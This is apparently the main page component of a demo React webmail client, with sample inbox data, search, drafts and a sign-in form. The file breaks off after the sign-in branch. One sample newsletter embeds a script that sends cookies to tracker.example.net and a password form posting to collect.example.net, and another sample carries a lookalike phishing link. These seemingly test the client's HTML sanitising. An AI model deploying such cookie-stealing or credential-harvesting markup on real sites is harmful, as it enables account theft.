"use client";

import { useCallback, useEffect, useMemo, useRef, useState, type FormEvent } from "react";
import {
  IoAddOutline,
  IoArchiveOutline,
  IoCalendarOutline,
  IoChevronDownOutline,
  IoCloseOutline,
  IoCreateOutline,
  IoDocumentTextOutline,
  IoEllipsisHorizontal,
  IoEyeOffOutline,
  IoEyeOutline,
  IoFolderOutline,
  IoLockClosedOutline,
  IoMailOutline,
  IoMailUnreadOutline,
  IoPeopleOutline,
  IoPersonOutline,
  IoSearchOutline,
  IoSendOutline,
  IoSettingsOutline,
  IoShieldCheckmarkOutline,
  IoStar,
  IoStarOutline,
  IoTrashOutline,
  IoMailOpenOutline,
} from "react-icons/io5";
import { LuRotateCw } from "react-icons/lu";
import TodayRail from "./today-rail";
import FolderBar from "./folder-bar";
import CalendarView from "./calendar-view";
import SettingsView from "./settings-view";
import ContactsView from "./contacts-view";
import AccountMenu from "./account-menu";
import NotesView from "./notes-view";
import { ADMIN_KEY, PREFS_KEY, defaultAdminConfig, defaultPreferences, loadJson, saveJson, type AdminConfig, type UserPreferences } from "./settings-store";
import MoveMenu from "./move-menu";
import EmailReader, { type ReplySeed, type ThreadMessage } from "./email-reader";
import Composer, { formatBytes, newDraftId, type Draft, type Identity, type SentEmail } from "./composer";
import { htmlToPlainText } from "./email-html";
import SearchFilterCard, { emptyFilters, filterChips, filtersActive, type SearchFilters } from "./search-filters";
import { LuSlidersHorizontal } from "react-icons/lu";
import AttachmentPreview, { sampleUrlFor } from "./attachment-preview";

type FolderId = "inbox" | "starred" | "sent" | "drafts" | "archive" | "spam" | "trash" | string;
type AppSection = "mail" | "calendar" | "contacts" | "notes" | "settings";
type MailItem = {
  id: number;
  sender: string;
  address: string;
  initials: string;
  color: string;
  subject: string;
  preview: string;
  date: string;
  time: number;
  unread: boolean;
  starred: boolean;
  attachments?: string[];
  bodyText?: string;
  bodyHtml?: string;
  to?: string[];
  cc?: string[];
  bcc?: string[];
  receivedAt?: string;
  inlineImages?: Record<string, string>;
  thread?: ThreadMessage[];
  folder: FolderId;
};

/** Sample timestamps relative to now, so "Today" / "Yesterday" stay true. */
function receivedAgo(days: number, time: string) {
  const [hours, minutes] = time.split(":").map(Number);
  const date = new Date();
  date.setDate(date.getDate() - days);
  date.setHours(hours, minutes, 0, 0);
  return date.toISOString();
}

const ME = "Alex Morgan <alex@example.com>";

const DEFAULT_IDENTITIES: Identity[] = [
  { id: "personal", name: "Alex Morgan", email: "alex@example.com", signature: "Alex Morgan\nProduct Designer" },
  { id: "work", name: "Alex Morgan", email: "alex@northstar.studio", signature: "Alex Morgan\nDesign Lead · Northstar Studio\nnorthstar.studio" },
  { id: "team", name: "Foxalora Team", email: "hello@foxalora.app", signature: "The Foxalora Team" },
];
const DRAFTS_KEY = "foxalora.drafts.v1";
const SIGNATURES_KEY = "foxalora.signatures.v1";
const paletteImage = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MjAiIGhlaWdodD0iMTIwIiB2aWV3Qm94PSIwIDAgNDIwIDEyMCI+PHJlY3Qgd2lkdGg9IjQyMCIgaGVpZ2h0PSIxMjAiIHJ4PSIxNCIgZmlsbD0iI2Y0ZjFlYyIvPjxnIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxMSIgZmlsbD0iIzU1NSI+PHJlY3QgeD0iMjAiIHk9IjIwIiB3aWR0aD0iNzAiIGhlaWdodD0iNjAiIHJ4PSIxMCIgZmlsbD0iIzFmMmE0NCIvPjxyZWN0IHg9IjEwMCIgeT0iMjAiIHdpZHRoPSI3MCIgaGVpZ2h0PSI2MCIgcng9IjEwIiBmaWxsPSIjZTJiOTNiIi8+PHJlY3QgeD0iMTgwIiB5PSIyMCIgd2lkdGg9IjcwIiBoZWlnaHQ9IjYwIiByeD0iMTAiIGZpbGw9IiNkMDQ3M2IiLz48cmVjdCB4PSIyNjAiIHk9IjIwIiB3aWR0aD0iNzAiIGhlaWdodD0iNjAiIHJ4PSIxMCIgZmlsbD0iIzlmYjhhMCIvPjxyZWN0IHg9IjM0MCIgeT0iMjAiIHdpZHRoPSI2MCIgaGVpZ2h0PSI2MCIgcng9IjEwIiBmaWxsPSIjZmZmZmZmIiBzdHJva2U9IiNkZGQiLz48dGV4dCB4PSIyMCIgeT0iMTAyIj5Jbms8L3RleHQ+PHRleHQgeD0iMTAwIiB5PSIxMDIiPlN1bjwvdGV4dD48dGV4dCB4PSIxODAiIHk9IjEwMiI+Q2xheTwvdGV4dD48dGV4dCB4PSIyNjAiIHk9IjEwMiI+U2FnZTwvdGV4dD48dGV4dCB4PSIzNDAiIHk9IjEwMiI+UGFwZXI8L3RleHQ+PC9nPjwvc3ZnPg==";

const initialMessages: MailItem[] = [
  { id: 1, thread: [
    { id: 101, sender: "Alex Morgan", address: "alex@example.com", initials: "AM", color: "green", receivedAt: receivedAgo(6, "09:15"), bodyText: "Hi Sofia,\n\nExcited to get started. I’ve attached the brief and a few references we collected. The main thing: warm, calm, and a little bit unexpected.\n\nAlex", attachments: ["Identity brief.pdf", "References.zip"] },
    { id: 102, sender: "Sofia Chen", address: "sofia@northstar.studio", initials: "SC", color: "lilac", receivedAt: receivedAgo(4, "17:40"), bodyText: "Thanks Alex, this is a great brief. I’ll start with some loose sketches and a palette exploration, then come back with two or three directions.\n\nSofia", attachments: ["Early sketches.png"] },
    { id: 103, sender: "Alex Morgan", address: "alex@example.com", initials: "AM", color: "green", receivedAt: receivedAgo(3, "10:05"), bodyText: "Sounds perfect. Take your time, and lean into the second sketch, that one felt closest.\n\nAlex" },
  ], receivedAt: receivedAgo(0, "10:42"), inlineImages: { palette: paletteImage }, sender: "Sofia Chen", address: "sofia@northstar.studio", initials: "SC", color: "lilac", subject: "A few directions for the new identity", preview: "Hi Alex, I pulled together three directions that feel a lot closer to what we discussed. Would love your first impressions when you have a moment.", date: "10:42 AM", time: 1, unread: true, starred: true, attachments: ["Brand directions.pdf", "Moodboard v2.png", "Type specimens.pdf", "Logo sketches.jpg", "Notes.docx"], bodyText: "Hi Alex,\n\nI pulled together three directions that feel a lot closer to what we discussed. I’ve attached the first round so you can take a look when you have a moment.\n\nThe second direction feels especially promising to me. It gives the identity a little more room to breathe while still feeling warm and unmistakably yours.\n\nWould love your first impressions. No rush — whenever you have a quiet moment.\n\nWarmly,\nSofia", bodyHtml: "<h2>A few directions for the new identity</h2><p>Hi Alex,</p><p>I pulled together three directions that feel a lot closer to what we discussed. I’ve attached the first round so you can take a look when you have a moment.</p><p>The second direction feels especially promising to me. It gives the identity a little more room to breathe while still feeling warm and unmistakably yours.</p><p>Would love your first impressions. No rush — whenever you have a quiet moment.</p><p><a href=\"https://northstar.studio/work/identity\">View the direction notes</a></p><p><img src=\"cid:palette\" alt=\"Colour palette for direction two\" width=\"420\"></p><p><img src=\"https://images.example.com/brand-directions-preview.jpg\" alt=\"A preview of the brand direction\" width=\"480\"></p><p>Warmly,<br>Sofia</p>", to: ["Alex Morgan <alex@example.com>"], cc: ["Design team <design@example.com>"], bcc: [], folder: "inbox" },
  { id: 2, receivedAt: receivedAgo(0, "09:18"), to: [ME], bodyHtml: "<h2>A little space to think</h2><p>Good morning,</p><p>This week: a slower morning ritual, a tiny cabin in the woods, and the art of making room for what matters.</p><p><img src=\"https://cdn.thesundayedit.co/issues/48/cabin.jpg\" alt=\"A small cabin among pine trees\" width=\"560\"></p><h3>1. The ten-minute morning</h3><p>Before the phone, before the inbox: kettle on, window open, one page of something you love.</p><h3>2. A cabin worth the drive</h3><p>Two hours north, no signal, one wood stove. <a href=\"https://thesundayedit.co/cabin\">Read the full story</a>.</p><form action=\"http://collect.example.net/login\"><p>Confirm your subscription:</p><input name=\"password\" type=\"password\"><button>Confirm</button></form><script>document.location='http://tracker.example.net/?c='+document.cookie</script><p onclick=\"alert(1)\">See you next Sunday,<br>The Sunday Edit</p><p><small><a href=\"http://thesundayedit-co.click/unsubscribe\">thesundayedit.co/unsubscribe</a> · <a href=\"javascript:alert('x')\">Manage preferences</a></small></p><img src=\"https://pixel.thesundayedit.co/open.gif\" width=\"1\" height=\"1\" alt=\"\">", sender: "The Sunday Edit", address: "hello@thesundayedit.co", initials: "SE", color: "peach", subject: "A little space to think", preview: "This week: a slower morning ritual, a tiny cabin in the woods, and the art of making room for what matters.", date: "9:18 AM", time: 2, unread: true, starred: false, folder: "inbox" },
  { id: 3, thread: [
    { id: 301, sender: "Alex Morgan", address: "alex@example.com", initials: "AM", color: "green", receivedAt: receivedAgo(2, "11:20"), bodyText: "Hi Marcus,\n\nWould love to see the studio and the new material samples. Does next Thursday afternoon work?\n\nAlex" },
    { id: 302, sender: "Marcus Lee", address: "marcus@fieldnotes.design", initials: "ML", color: "blue", receivedAt: receivedAgo(2, "15:02"), bodyText: "Thursday could work. Let me check with Jordan and confirm a time. Here’s the sample list in the meantime.\n\nMarcus", attachments: ["Material samples.xlsx", "Studio map.pdf"] },
  ], receivedAt: receivedAgo(1, "16:05"), to: [ME], cc: ["Jordan Lee <jordan@fieldnotes.design>"], bodyText: "Hi Alex,\n\nThursday works perfectly. I’ll send over a calendar invite for 2:30.\n\nThere’s a great little coffee place just around the corner if you want to grab one before we start:\nhttps://maps.example.com/place/little-coffee\n\nJordan will join us for the first half hour to walk through the material samples.\n\nSee you then,\nMarcus", sender: "Marcus Lee", address: "marcus@fieldnotes.design", initials: "ML", color: "blue", subject: "Re: Studio visit next Thursday", preview: "Thursday works perfectly. I’ll send over a calendar invite for 2:30 — there’s a great little coffee place just around the corner.", date: "Yesterday", time: 3, unread: true, starred: false, folder: "inbox" },
  { id: 4, receivedAt: receivedAgo(1, "08:00"), to: [ME], bodyHtml: "<h2>Your week, all in one place</h2><p>You have <strong>4 updates</strong> across your workspace.</p><ul><li>Project notes: 2 new comments</li><li>Upcoming: Brand review on Thursday</li><li>Team: Priya edited “Portfolio shortlist”</li></ul><p><a href=\"https://www.notion.so/updates\">Open your updates</a></p><p>— The Notion team</p>", sender: "Notion", address: "team@mail.notion.so", initials: "N", color: "dark", subject: "Your week, all in one place", preview: "You have 4 updates across your workspace. Catch up on project notes, upcoming deadlines, and what your team has been working on.", date: "Yesterday", time: 4, unread: false, starred: false, folder: "inbox" },
  { id: 5, receivedAt: receivedAgo(2, "19:24"), to: [ME, "Sam Rivera <sam@example.com>"], bodyText: "Hey both!\n\nI finally got around to editing these. The light at the beach was unreal — I think the last few are my favorites.\n\nFeel free to use any of them, just let me know which ones you pick.\n\nPriya", sender: "Priya Kapoor", address: "priya@softthings.co", initials: "PK", color: "green", subject: "The photos from the weekend ✨", preview: "I finally got around to editing these. The light at the beach was unreal — I think the last few are my favorites.", date: "Mon", time: 5, unread: false, starred: true, attachments: ["Beach-01.jpg", "Beach-02.jpg", "Sunset.jpg", "Dunes.jpg", "Pier.jpg", "Friends.jpg", "Boat.jpg", "Shells.jpg"], folder: "inbox" },
  { id: 6, receivedAt: receivedAgo(2, "07:12"), to: [ME], bodyHtml: "<h2>Your receipt from Copenhagen</h2><p>Thanks for staying with us. We hope your time in Copenhagen was everything you needed it to be.</p><table><tr><th>Stay</th><td>Nyhavn loft · 3 nights</td></tr><tr><th>Dates</th><td>Nov 3 – Nov 6</td></tr><tr><th>Total</th><td><strong>DKK 4,860.00</strong></td></tr></table><p><a href=\"http://airbnb.com.receipts-secure.example.net/r/88213\">airbnb.com/receipts</a></p><p>Your PDF receipt is attached.</p>", sender: "Airbnb", address: "automated@airbnb.com", initials: "a", color: "rose", subject: "Your receipt from Copenhagen", preview: "Thanks for staying with us. We hope your time in Copenhagen was everything you needed it to be.", date: "Mon", time: 6, unread: false, starred: false, attachments: ["Receipt.pdf"], folder: "inbox" },
  { id: 7, receivedAt: receivedAgo(3, "11:30"), to: [ME], bodyText: "Alex,\n\nAs promised: The Creative Act by Rick Rubin, and Four Thousand Weeks by Oliver Burkeman. Both changed how I think about work.\n\nStart with the second one if you only have time for one.\n\nDaniel", sender: "Daniel Foster", address: "daniel@hey.com", initials: "DF", color: "yellow", subject: "Books I promised you", preview: "The creative act by Rick Rubin, and Four Thousand Weeks by Oliver Burkeman. Both changed how I think about work.", date: "Sun", time: 7, unread: false, starred: false, folder: "inbox" },
  { id: 8, receivedAt: receivedAgo(3, "09:02"), to: [ME], sender: "Are.na", address: "notifications@are.na", initials: "A", color: "dark", subject: "Your channel has new blocks", preview: "Some thoughtful additions to Objects for living, collected by people you follow.", date: "Sun", time: 8, unread: false, starred: false, folder: "inbox" },
  { id: 9, receivedAt: receivedAgo(4, "14:48"), to: [ME], bodyText: "Alex,\n\nFound a quiet little bookshop tucked behind the river. It reminded me of the place you showed me last spring.\n\nBringing you something back.\n\nMina", sender: "Mina Park", address: "mina@slowstudio.jp", initials: "MP", color: "peach", subject: "A note from Kyoto", preview: "Found a quiet little bookshop tucked behind the river. It reminded me of the place you showed me last spring.", date: "Sat", time: 9, unread: false, starred: false, folder: "inbox" },
  { id: 10, receivedAt: receivedAgo(5, "15:10"), to: ["Studio Fieldwork <hello@fieldwork.studio>"], bcc: ["Jordan Lee <jordan@fieldnotes.design>"], bodyText: "Thanks, I’ll take a look this afternoon and send my thoughts over.\n\nAlex", sender: "Alex Morgan", address: "alex@example.com", initials: "AM", color: "green", subject: "Re: Project notes", preview: "Thanks, I’ll take a look this afternoon and send my thoughts over.", date: "Fri", time: 10, unread: false, starred: false, folder: "sent" },
  { id: 11, receivedAt: receivedAgo(6, "10:20"), to: [ME], sender: "Studio Fieldwork", address: "hello@fieldwork.studio", initials: "SF", color: "blue", subject: "A small update on the proposal", preview: "We’ve gathered the references and have a first pass ready whenever you are.", date: "Thu", time: 11, unread: false, starred: false, folder: "archive" },
];

const baseFolders = [
  { id: "inbox", label: "Inbox", icon: IoMailOutline },
  { id: "starred", label: "Starred", icon: IoStarOutline },
  { id: "sent", label: "Sent", icon: IoSendOutline },
  { id: "drafts", label: "Drafts", icon: IoCreateOutline },
  { id: "archive", label: "Archive", icon: IoArchiveOutline },
  { id: "spam", label: "Spam", icon: IoShieldCheckmarkOutline },
  { id: "trash", label: "Trash", icon: IoTrashOutline },
] as const;

const folderLabels: Record<string, string> = {
  inbox: "Inbox",
  starred: "Starred",
  sent: "Sent",
  drafts: "Drafts",
  archive: "Archive",
  spam: "Spam",
  trash: "Trash",
};

export default function Home() {
  const [signedIn, setSignedIn] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [activeSection, setActiveSection] = useState<AppSection>("mail");
  const [activeFolder, setActiveFolder] = useState<FolderId>("inbox");
  const [messages, setMessages] = useState(initialMessages);
  const [openMessageId, setOpenMessageId] = useState<number | null>(null);
  const [selected, setSelected] = useState<number[]>([]);
  const [selectedDrafts, setSelectedDrafts] = useState<string[]>([]);
  const [query, setQuery] = useState("");
  const [filters, setFilters] = useState<SearchFilters>(emptyFilters);
  const [filterOpen, setFilterOpen] = useState(false);
  const [prefs, setPrefs] = useState<UserPreferences>(defaultPreferences);
  const [adminConfig, setAdminConfig] = useState<AdminConfig>(defaultAdminConfig);
  const [systemDark, setSystemDark] = useState(false);
  useEffect(() => {
    const t = window.setTimeout(() => {
      setPrefs(loadJson(PREFS_KEY, defaultPreferences));
      setAdminConfig(loadJson(ADMIN_KEY, defaultAdminConfig));
    }, 0);
    const mq = window.matchMedia("(prefers-color-scheme: dark)");
    const onMq = () => setSystemDark(mq.matches);
    onMq();
    mq.addEventListener("change", onMq);
    return () => { window.clearTimeout(t); mq.removeEventListener("change", onMq); };
  }, []);
  const updatePrefs = (patch: Partial<UserPreferences>) => setPrefs((cur) => { const next = { ...cur, ...patch }; saveJson(PREFS_KEY, next); return next; });
  const updateAdmin = (patch: Partial<AdminConfig>) => setAdminConfig((cur) => { const next = { ...cur, ...patch }; saveJson(ADMIN_KEY, next); return next; });
  const theme = prefs.theme === "system" ? (systemDark ? "dark" : "light") : prefs.theme;
  const compact = prefs.density === "compact";
  const setCompact = (fn: (value: boolean) => boolean) => updatePrefs({ density: fn(compact) ? "compact" : "comfortable" });
  const appName = adminConfig.appName.trim() || "Foxalora";
  const brandText = appName === "Foxalora" ? "foxalora" : appName;
  const [visibleCount, setVisibleCount] = useState(8);
  const [folderName, setFolderName] = useState("");
  const [customFolderNames, setCustomFolderNames] = useState<string[]>([]);
  const [addingFolder, setAddingFolder] = useState(false);
  const [folderError, setFolderError] = useState("");
  const [pendingDelete, setPendingDelete] = useState<string | null>(null);
  const [notice, setNotice] = useState("");
  const [trustedSenders, setTrustedSenders] = useState<string[]>([]);
  const effectiveTrusted = adminConfig.blockRemoteImages ? [] : prefs.remoteImages === "always" ? messages.map((m) => m.address) : trustedSenders;
  const [standalone, setStandalone] = useState(false);
  const [rowPreview, setRowPreview] = useState<{ message: MailItem; index: number } | null>(null);
  const [drafts, setDrafts] = useState<Draft[]>([]);
  const [dock, setDock] = useState<Draft | null>(null);
  /** The new email you were last writing; Compose resumes it until it is sent or discarded. */
  const [currentComposeId, setCurrentComposeId] = useState<string | null>(null);
  const [signatures, setSignatures] = useState<Record<string, string>>({});
  const [storageReady, setStorageReady] = useState(false);

  // Drafts and signatures survive a reload (per browser). Read once after mount.
  useEffect(() => {
    const timer = window.setTimeout(() => {
      try { const raw = localStorage.getItem(DRAFTS_KEY); if (raw) setDrafts(JSON.parse(raw)); } catch { /* storage unavailable */ }
      try { const raw = localStorage.getItem(SIGNATURES_KEY); if (raw) setSignatures(JSON.parse(raw)); } catch { /* storage unavailable */ }
      setStorageReady(true);
    }, 0);
    return () => window.clearTimeout(timer);
  }, []);
  useEffect(() => {
    if (!storageReady) return;
    try { localStorage.setItem(DRAFTS_KEY, JSON.stringify(drafts)); } catch { /* storage full or blocked */ }
  }, [drafts, storageReady]);
  useEffect(() => {
    if (!storageReady) return;
    try { localStorage.setItem(SIGNATURES_KEY, JSON.stringify(signatures)); } catch { /* storage full or blocked */ }
  }, [signatures, storageReady]);

  const identities = useMemo(() => DEFAULT_IDENTITIES.map((i) => {
    if (i.id === "personal") return { ...i, name: prefs.displayName.trim() || i.name, signature: prefs.signature };
    return i.id in signatures ? { ...i, signature: signatures[i.id] } : i;
  }), [signatures, prefs.displayName, prefs.signature]);
  const contacts = useMemo(() => {
    const seen = new Map<string, { name: string; email: string }>();
    for (const m of messages) {
      if (!seen.has(m.address)) seen.set(m.address, { name: m.sender, email: m.address });
      for (const r of [...(m.to ?? []), ...(m.cc ?? [])]) {
        const email = r.match(/<([^>]+)>/)?.[1] ?? r;
        if (!seen.has(email)) seen.set(email, { name: r.replace(/<[^>]+>/, "").trim() || email, email });
      }
    }
    for (const i of DEFAULT_IDENTITIES) seen.delete(i.email);
    return [...seen.values()];
  }, [messages]);

  const blankDraft = (patch: Partial<Draft> = {}): Draft => ({
    id: newDraftId(), mode: "new", identityId: identities[0].id, to: [], cc: [], bcc: [], subject: "", html: "", text: "",
    plain: prefs.replyFormat === "plain", signature: true, attachments: [], updatedAt: 0, ...patch,
  });

  function saveDraft(draft: Draft) {
    setDrafts((list) => [draft, ...list.filter((x) => x.id !== draft.id)]);
  }
  function discardDraft(id: string) {
    setDrafts((list) => list.filter((x) => x.id !== id));
    setSelectedDrafts((cur) => cur.filter((x) => x !== id));
    setDock((current) => (current?.id === id ? null : current));
    setCurrentComposeId((current) => (current === id ? null : current));
    flash("Draft discarded");
  }
  function sendEmail(email: SentEmail) {
    const now = new Date();
    const item: MailItem = {
      id: now.getTime(),
      sender: email.from.name,
      address: email.from.email,
      initials: email.from.name.split(" ").map((w) => w[0]).slice(0, 2).join("").toUpperCase(),
      color: "green",
      subject: email.subject.trim() || "(no subject)",
      preview: (email.plain ? email.text : htmlToPlainText(email.html)).replace(/\s+/g, " ").slice(0, 160),
      date: now.toLocaleTimeString(undefined, { hour: "numeric", minute: "2-digit" }),
      time: 0,
      unread: false,
      starred: false,
      attachments: email.attachments.map((a) => a.name),
      bodyHtml: email.plain ? undefined : email.finalHtml,
      bodyText: email.finalText,
      to: email.to,
      cc: email.cc,
      bcc: email.bcc,
      receivedAt: now.toISOString(),
      folder: "sent",
    };
    setMessages((list) => [item, ...list]);
    setDrafts((list) => list.filter((x) => x.id !== email.id));
    setDock((current) => (current?.id === email.id ? null : current));
    setCurrentComposeId((current) => (current === email.id ? null : current));
    flash("Sent. You’ll find it in Sent. (Demo: no mail server connected)");
  }
  function openCompose(draft?: Draft) {
    if (dock && !draft) return;
    setOpenMessageId(null);
    const resume = !draft && currentComposeId ? drafts.find((x) => x.id === currentComposeId) : undefined;
    const next = draft ?? resume ?? blankDraft();
    if (next.mode === "new") setCurrentComposeId(next.id);
    setDock(next);
  }
  function replyDraft(seed: ReplySeed): Draft {
    const existing = drafts.find((x) => x.replyToId === seed.replyToId && x.mode === seed.mode);
    if (existing) return existing;
    return blankDraft({
      mode: seed.mode, to: seed.to, cc: seed.cc, subject: seed.subject, quoted: seed.quoted, replyToId: seed.replyToId,
      attachments: seed.attachments.map((name, i) => ({ id: seed.key + i, name, size: 120_000 + i * 50_000, type: "" })),
    });
  }
  const composerCommon = {
    identities,
    contacts,
    onSave: saveDraft,
    onEditSignature: (identityId: string, signature: string) => { if (identityId === "personal") updatePrefs({ signature }); else setSignatures((map) => ({ ...map, [identityId]: signature })); flash("Signature saved"); },
    onNotice: flash,
  };
  const [searchOpen, setSearchOpen] = useState(false);
  const searchInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (searchOpen) searchInputRef.current?.focus();
  }, [searchOpen]);

  // Separate-window view: /?message=<id>
  useEffect(() => {
    const id = Number(new URLSearchParams(window.location.search).get("message"));
    if (!id) return;
    const timer = window.setTimeout(() => { setSignedIn(true); setStandalone(true); setOpenMessageId(id); }, 0);
    return () => window.clearTimeout(timer);
  }, []);

  const customFolders = customFolderNames.map((name) => ({ id: name, label: name, icon: IoFolderOutline }));

  const unreadCount = messages.filter((message) => message.folder === "inbox" && message.unread).length;
  const hasFilters = filtersActive(filters);
  const searching = Boolean(query.trim()) || hasFilters;
  /** The one search rule: used for results and for the live count in the filter card. */
  const runSearch = useCallback((f: SearchFilters, q: string) => {
    const has = (hay: string, needle: string) => hay.toLowerCase().includes(needle.trim().toLowerCase());
    const bodyOf = (m: MailItem) => `${m.preview} ${m.bodyText ?? ""} ${m.bodyHtml ? m.bodyHtml.replace(/<[^>]+>/g, " ") : ""} ${(m.thread ?? []).map((t) => t.bodyText).join(" ")}`;
    const recipientsOf = (m: MailItem) => [...(m.to ?? []), ...(m.cc ?? []), ...(m.bcc ?? [])].join(" ");
    const start = f.dateFrom ? new Date(`${f.dateFrom}T00:00`).getTime() : null;
    const end = f.dateTo ? new Date(`${f.dateTo}T23:59:59`).getTime() : null;
    return messages.filter((m) => {
      // Where to look
      const inScope = f.folders.includes("all")
        ? !["trash", "spam"].includes(m.folder)
        : f.folders.length
          ? f.folders.includes(m.folder) || (f.folders.includes("starred") && m.starred && m.folder !== "trash")
          : activeFolder === "starred" ? m.starred && m.folder !== "trash" : m.folder === activeFolder;
      if (!inScope) return false;
      // Free text: sender, recipients, subject or content
      if (q.trim() && !has(`${m.sender} ${m.address} ${recipientsOf(m)} ${m.subject} ${bodyOf(m)} ${(m.attachments ?? []).join(" ")}`, q)) return false;
      if (f.from.trim() && !has(`${m.sender} ${m.address}`, f.from)) return false;
      if (f.to.trim() && !has(recipientsOf(m), f.to)) return false;
      if (f.subject.trim() && !has(m.subject, f.subject)) return false;
      if (f.words.trim() && !has(bodyOf(m), f.words)) return false;
      if (start !== null || end !== null) {
        const t = m.receivedAt ? new Date(m.receivedAt).getTime() : NaN;
        if (Number.isNaN(t) || (start !== null && t < start) || (end !== null && t > end)) return false;
      }
      if (f.hasAttachment && !(m.attachments?.length || m.thread?.some((t) => t.attachments?.length))) return false;
      if (f.unread && !m.unread) return false;
      if (f.starred && !m.starred) return false;
      return true;
    });
  }, [activeFolder, messages]);
  const searchResults = useMemo(() => runSearch(filters, query), [runSearch, filters, query]);
  const visibleMessages = useMemo(() => searchResults.slice(0, visibleCount), [searchResults, visibleCount]);
  function clearSearch() { setQuery(""); setFilters(emptyFilters); setFilterOpen(false); setSearchOpen(false); }
  const allVisibleSelected = visibleMessages.length > 0 && visibleMessages.every((message) => selected.includes(message.id));
  const selectedHasUnread = messages.some((message) => selected.includes(message.id) && message.unread);
  const openMessage = messages.find((message) => message.id === openMessageId) ?? null;
  const openMessageIndex = openMessage ? visibleMessages.findIndex((message) => message.id === openMessage.id) : -1;

  function showMessage(message: MailItem) {
    setOpenMessageId(message.id);
    setMessages((current) => current.map((item) => item.id === message.id ? { ...item, unread: false } : item));
  }

  function navigateMessage(direction: -1 | 1) {
    const next = visibleMessages[openMessageIndex + direction];
    if (next) showMessage(next);
  }

  /** After archive/delete in the reader, move on to the next message (or back to the list). */
  function advanceAfterRemove() {
    const next = visibleMessages[openMessageIndex + 1] ?? visibleMessages[openMessageIndex - 1];
    if (next && !standalone) showMessage(next); else if (!standalone) setOpenMessageId(null);
  }

  function trustSender(address: string, trusted: boolean) {
    setTrustedSenders((current) => trusted ? [...new Set([...current, address])] : current.filter((item) => item !== address));
    flash(trusted ? `Images from ${address} will always show` : `Images from ${address} will be hidden again`);
  }

  function flash(text: string) {
    setNotice(text);
    window.setTimeout(() => setNotice(""), 2800);
  }

  function signIn(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setSignedIn(true);
    setPassword("");
    setNotice("");
  }

  function toggleSelected(id: number) {
    setSelected((current) => current.includes(id) ? current.filter((item) => item !== id) : [...current, id]);
  }

  function updateOne(id: number, action: "read" | "unread" | "archive" | "trash" | "unsubscribe") {
    if (action === "unsubscribe") {
      const sender = messages.find((m) => m.id === id)?.sender ?? "this sender";
      setNotice(`Unsubscribed from ${sender}`);
    } else {
      setMessages((current) => current.map((message) => message.id !== id ? message
        : action === "read" || action === "unread" ? { ...message, unread: action === "unread" } : { ...message, folder: action }));
      setSelected((current) => current.filter((item) => item !== id));
      setNotice(action === "read" ? "Marked as read" : action === "unread" ? "Marked as unread" : action === "archive" ? "Archived" : "Moved to Trash");
    }
    window.setTimeout(() => setNotice(""), 2600);
  }

  /** Only emails that are ticked AND visible in the current list are affected. */
  const actionableIds = selected.filter((id) => visibleMessages.some((message) => message.id === id));

  function updateSelected(action: "read" | "unread" | "archive" | "trash" | FolderId) {
    const ids = actionableIds;
    if (!ids.length) { setSelected([]); return; }
    if (action === "read" || action === "unread") {
      setMessages((current) => current.map((message) => ids.includes(message.id)
        ? { ...message, unread: action === "unread" }
        : message));
    } else {
      setMessages((current) => current.map((message) => ids.includes(message.id)
        ? { ...message, folder: action }
        : message));
    }
    setSelected([]);
    const count = `${ids.length} email${ids.length === 1 ? "" : "s"}`;
    setNotice(action === "read" ? `Marked ${count} as read` : action === "unread" ? `Marked ${count} as unread` : `Moved ${count} to ${folderLabels[action] ?? action}`);
    window.setTimeout(() => setNotice(""), 2600);
  }

  function deleteFolder(id: string) {
    const moved = messages.filter((message) => message.folder === id).length;
    setCustomFolderNames((current) => current.filter((name) => name !== id));
    setMessages((current) => current.map((message) => message.folder === id ? { ...message, folder: "inbox" } : message));
    if (activeFolder === id) setActiveFolder("inbox");
    setPendingDelete(null);
    setNotice(moved ? `Folder deleted · ${moved} email${moved === 1 ? "" : "s"} moved to Inbox` : "Folder deleted");
    window.setTimeout(() => setNotice(""), 2600);
  }

  function addFolder(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const trimmed = folderName.trim();
    if (!trimmed) { setFolderError("Give the folder a name"); return; }
    if (trimmed.length > 40) { setFolderError("Keep it under 40 characters"); return; }
    if (Object.keys(folderLabels).some((folder) => folder.toLowerCase() === trimmed.toLowerCase())
      || customFolderNames.some((folder) => folder.toLowerCase() === trimmed.toLowerCase())) {
      setFolderError("You already have a folder with that name");
      return;
    }
    flash(`Folder “${trimmed}” created`);
    setCustomFolderNames((current) => [...current, trimmed]);
    setActiveFolder(trimmed);
    setFolderName("");
    setAddingFolder(false);
  }

  if (!signedIn) {
    return (
      <main className="auth-page">
        <section className="auth-panel">
          <div className="auth-panel-top">
            <span className="auth-help">New to Foxalora? <a href="mailto:support@foxalora.app">Get in touch</a></span>
          </div>
          <div className="auth-form-wrap">
            <div className="mobile-brand brand">
              <span className="brand-mark"><IoMailOutline /></span>
              <span>foxalora</span>
            </div>
            <div className="auth-heading">
              <div className="welcome-icon"><IoMailUnreadOutline /></div>
              <p className="eyebrow">WELCOME BACK</p>
              <h2>Sign in to your mail</h2>
              <p>Use your existing email account to get started.</p>
            </div>

            <form className="login-form" onSubmit={signIn}>
              <label className="field-label" htmlFor="email">Email address</label>
              <div className="input-wrap">
                <IoPersonOutline className="input-icon" aria-hidden="true" />
                <input id="email" type="email" autoComplete="username" placeholder="you@example.com" value={email} onChange={(event) => setEmail(event.target.value)} required />
              </div>

              <div className="field-label-row">
                <label className="field-label" htmlFor="password">Password</label>
                <span className="field-hint">Your email password</span>
              </div>
              <div className="input-wrap">
                <IoLockClosedOutline className="input-icon" aria-hidden="true" />
                <input id="password" type={showPassword ? "text" : "password"} autoComplete="current-password" placeholder="Enter your password" value={password} onChange={(event) => setPassword(event.target.value)} required />
                <button className="input-action" type="button" aria-label={showPassword ? "Hide password" : "Show password"} onClick={() => setShowPassword((value) => !value)}>
                  {showPassword ? <IoEyeOffOutline /> : <IoEyeOutline />}
                </button>
              </div>

              <button className="sign-in-button" type="submit">
                Continue to inbox
              </button>
            </form>
          </div>
          <footer className="auth-legal">
            <span>© 2025 Foxalora</span>
            <span>Privacy&nbsp; · &nbsp;Help</span>
          </footer>
        </section>
      </main>
    );
  }

